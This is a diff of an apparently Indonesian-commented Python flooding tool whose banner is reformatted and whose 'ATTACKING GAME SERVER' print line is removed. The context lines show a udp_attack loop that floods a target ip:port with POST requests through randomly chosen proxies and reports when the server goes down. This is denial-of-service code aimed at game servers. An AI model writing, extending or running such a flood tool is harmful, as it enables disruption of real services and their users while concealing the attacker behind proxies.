@@ -4,11 +4,16 @@ import time
 import requests
 
 print("""
-\033[31m◕▬▬▬▬▬▬▬▬▬◕.❋[❤].❋◕ ▬▬▬▬▬▬▬▬▬◕
-\033[32m████░████▄░██░████░██▄░██░████▄░░▄███▄
-\033[33m██▄░░██░██░██░██▄░░███▄██░██░▀██░▀█▄▀▀
-\033[34m██▀░░████▀░██░██▀░░██▀███░██░▄██░▄▄▀█▄
-\033[35m██░░░██░██░██░████░██░░██░████▀░░▀███▀
+\033[31m◕▬▬▬▬▬▬▬▬▬◕.❋[❤].❋◕ ▬▬▬▬▬▬▬▬▬◕
+
+\033[32m████░████▄░██░████░██▄░██░████▄░░▄███▄
+
+\033[33m██▄░░██░██░██░██▄░░███▄██░██░▀██░▀█▄▀▀
+
+\033[34m██▀░░████▀░██░██▀░░██▀███░██░▄██░▄▄▀█▄
+
+\033[35m██░░░██░██░██░████░██░░██░████▀░░▀███▀
+
 \033[36m◕▬▬▬▬▬▬▬▬▬◕.❋[❤].❋◕ ▬▬▬▬▬▬▬▬▬◕
 """)
 
@@ -54,7 +59,6 @@ def udp_attack(data_size):
                     url = f"http://{ip}:{port}"
                     proxy = random.choice(proxies) if proxies else None  # Memilih proxy secara acak dari daftar proxy
                     requests.post(url, data=data, proxies={'http': proxy})
-                    print(i + f" \033[91m}=====> UDP BYPASSED \033[33mATTACKING GAME SERVER \033[0m{ip}:{port}!!!")
                 time.sleep(0.1)  # Serangan berdenyut dengan interval 0.1 detik
         except Exception as e:
             print(f"[!] Server Down!!! {e}")
